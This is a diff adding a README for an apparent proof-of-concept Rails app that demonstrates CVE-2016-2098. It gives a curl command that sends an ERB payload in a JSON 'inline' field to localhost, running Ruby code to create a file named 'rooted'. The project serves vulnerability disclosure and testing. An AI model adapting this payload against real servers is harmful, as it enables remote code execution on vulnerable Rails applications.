@@ -1,0 +1,13 @@
+== README
+Proof of concept for  https://groups.google.com/forum/#!topic/rubyonrails-security/ly-IH-fxr_Q
+
+
+== Exploiting:
+1. You should only run rails server in a way that you are certain will not open you up to being exploited
+2. Run `rails s`
+3. Execute the following command
+`curl -v -H "Accept: application/json" -H "Content-type: application/json" -X GET -d ' {"id" : { "inline" : "<%= FileUtils.touch \"rooted\"%>"}}'  http://localhost:3000/exploits`
+4. Verify that the file "rooted" now exists in the project directory
+
+== Other:
+https://www.cvedetails.com/cve/CVE-2016-2098/
